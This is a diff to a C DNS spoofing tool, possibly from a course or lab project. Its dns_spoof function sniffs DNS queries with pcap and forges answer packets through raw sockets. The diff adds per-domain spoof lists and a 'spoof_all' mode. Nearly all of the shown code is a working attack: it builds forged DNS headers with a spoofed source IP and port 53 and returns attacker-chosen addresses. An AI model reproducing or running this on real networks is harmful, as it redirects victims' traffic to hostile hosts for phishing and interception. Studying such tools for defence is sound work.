@@ -161,10 +161,10 @@ void dns_spoof(struct node *args, const struct pcap_pkthdr *header, const u_char
 	char spoof_ip[32], *reply;
 	unsigned char split_ip[4];
 	struct in_addr dest, src;
+	int spoof_it = 0;
+	struct node *current;
 
-
-	printf("%s - %s\n", args->spoof_ip, args->spoof_domain);
-	get_ip_of_attacker("ens33", spoof_ip);
+	// get_ip_of_attacker("ens33", spoof_ip);
 	memset(reply_packet, 0, PACKET_SIZE);
 
 	/* define ethernet header */
@@ -200,61 +200,78 @@ void dns_spoof(struct node *args, const struct pcap_pkthdr *header, const u_char
 	}
 	request[--j] = '\0';
 
+	if (!strcmp(args->spoof_domain, "spoof_all")) {
+		spoof_it = 1;
+		memcpy(spoof_ip, args->spoof_ip, 32);
+	} else {
+		current = args;
+		while (current != NULL) {
+			if (!strcmp(current->spoof_domain, request)) {
+				memcpy(spoof_ip, current->spoof_ip, 32);
+				spoof_it = 1;
+			}
+			current = current->next;
+		}
+	}
 
-	/* reply is pointed to the beginning of dns header */
-	reply = reply_packet + sizeof(struct ip) + sizeof(struct udphdr);
+	if (spoof_it == 1) {
+		/* reply is pointed to the beginning of dns header */
+		reply = reply_packet + sizeof(struct ip) + sizeof(struct udphdr);
 
-	// reply dns_hdr
-	memcpy(&reply[0], dns_hdr->id, 2);
-	memcpy(&reply[2], "\x81\x80\x00\x01\x00\x01\x00\x00\x00\x00", 10);
+		// reply dns_hdr
+		memcpy(&reply[0], dns_hdr->id, 2);
+		memcpy(&reply[2], "\x81\x80\x00\x01\x00\x01\x00\x00\x00\x00", 10);
 
-	// reply dns_question
-	dns_question_in = (struct dns_question*)(((char*) dns_hdr) + sizeof(struct dns_header));
-	size = strlen(request) + 2;
-	memcpy(&reply[12], dns_question_in, size);
-	size += 12;
-	memcpy(&reply[size], "\x00\x01\x00\x01", 4);
-	size += 4;
+		// reply dns_question
+		dns_question_in = (struct dns_question*)(((char*) dns_hdr) + sizeof(struct dns_header));
+		size = strlen(request) + 2;
+		memcpy(&reply[12], dns_question_in, size);
+		size += 12;
+		memcpy(&reply[size], "\x00\x01\x00\x01", 4);
+		size += 4;
 
-	// reply dns_answer
-	memcpy(&reply[size], "\xc0\x0c\x00\x01\x00\x01\x00\x00\x00\x22\x00\x04", 12);
-	size += 12;
-	sscanf(spoof_ip, "%d.%d.%d.%d", (int *)&split_ip[0], (int *)&split_ip[1], (int *)&split_ip[2], (int *)&split_ip[3]);
-	memcpy(&reply[size], split_ip, 4);
-	size += 4;
+		// reply dns_answer
+		memcpy(&reply[size], "\xc0\x0c\x00\x01\x00\x01\x00\x00\x00\x22\x00\x04", 12);
+		size += 12;
+		sscanf(spoof_ip, "%d.%d.%d.%d", (int *)&split_ip[0], (int *)&split_ip[1], (int *)&split_ip[2], (int *)&split_ip[3]);
+		memcpy(&reply[size], split_ip, 4);
+		size += 4;
 
-	reply_packet_size = size;
+		reply_packet_size = size;
 
-	// IP datatgram
-	// http://www.binarytides.com/raw-sockets-c-code-linux/
-	reply_ip_hdr = (struct ip *) reply_packet;
-	reply_udp_hdr = (struct udphdr *) (reply_packet + sizeof (struct ip));
-	reply_ip_hdr->ip_hl = 5; //header length
-	reply_ip_hdr->ip_v = 4; //version
-	reply_ip_hdr->ip_tos = 0; //tos
-	reply_ip_hdr->ip_len = sizeof(struct ip) + sizeof(struct udphdr) + reply_packet_size;  //length
-	reply_ip_hdr->ip_id = 0; //id
-	reply_ip_hdr->ip_off = 0; //fragment offset
-	reply_ip_hdr->ip_ttl = 255; //ttl
-	reply_ip_hdr->ip_p = 17; //protocol
-	reply_ip_hdr->ip_sum = 0; //temp checksum
-	reply_ip_hdr->ip_src.s_addr = inet_addr(dst_ip); //src ip - spoofed
-	reply_ip_hdr->ip_dst.s_addr = inet_addr(src_ip); //dst ip
+		// IP datatgram
+		// http://www.binarytides.com/raw-sockets-c-code-linux/
+		reply_ip_hdr = (struct ip *) reply_packet;
+		reply_udp_hdr = (struct udphdr *) (reply_packet + sizeof (struct ip));
+		reply_ip_hdr->ip_hl = 5; //header length
+		reply_ip_hdr->ip_v = 4; //version
+		reply_ip_hdr->ip_tos = 0; //tos
+		reply_ip_hdr->ip_len = sizeof(struct ip) + sizeof(struct udphdr) + reply_packet_size;  //length
+		reply_ip_hdr->ip_id = 0; //id
+		reply_ip_hdr->ip_off = 0; //fragment offset
+		reply_ip_hdr->ip_ttl = 255; //ttl
+		reply_ip_hdr->ip_p = 17; //protocol
+		reply_ip_hdr->ip_sum = 0; //temp checksum
+		reply_ip_hdr->ip_src.s_addr = inet_addr(dst_ip); //src ip - spoofed
+		reply_ip_hdr->ip_dst.s_addr = inet_addr(src_ip); //dst ip
 
-	reply_udp_hdr->source = htons(53); //src port - spoofed
-	reply_udp_hdr->dest = udp->source;
-	reply_udp_hdr->len = htons(sizeof(struct udphdr) + reply_packet_size); //length
-	reply_udp_hdr->check = 0; //checksum - disabled
+		reply_udp_hdr->source = htons(53); //src port - spoofed
+		reply_udp_hdr->dest = udp->source;
+		reply_udp_hdr->len = htons(sizeof(struct udphdr) + reply_packet_size); //length
+		reply_udp_hdr->check = 0; //checksum - disabled
 
-	reply_ip_hdr->ip_sum = find_checksum((unsigned short *) reply_packet, reply_ip_hdr->ip_len >> 1);
+		reply_ip_hdr->ip_sum = find_checksum((unsigned short *) reply_packet, reply_ip_hdr->ip_len >> 1);
 
-	/* update the datagram size with ip and udp header */
-	reply_packet_size += (sizeof(struct ip) + sizeof(struct udphdr));
+		/* update the datagram size with ip and udp header */
+		reply_packet_size += (sizeof(struct ip) + sizeof(struct udphdr));
 
-	/* sends our dns spoof msg */
-	send_dns_reply(src_ip, ntohs((*(u_int16_t*)&udp)), reply_packet, reply_packet_size);
-	// // printf("%s\n", datagram);
-	printf("Spoofed %s requested from %s\n", request, src_ip);
+		/* sends our dns spoof msg */
+		send_dns_reply(src_ip, ntohs((*(u_int16_t*)&udp)), reply_packet, reply_packet_size);
+		// // printf("%s\n", datagram);
+		printf("Spoofed %s requested from %s\n", request, src_ip);
+	} else {
+		printf("Not Spoofing %s requested from %s as it's not listed in file.\n", request, src_ip);
+	}
 }
 
 
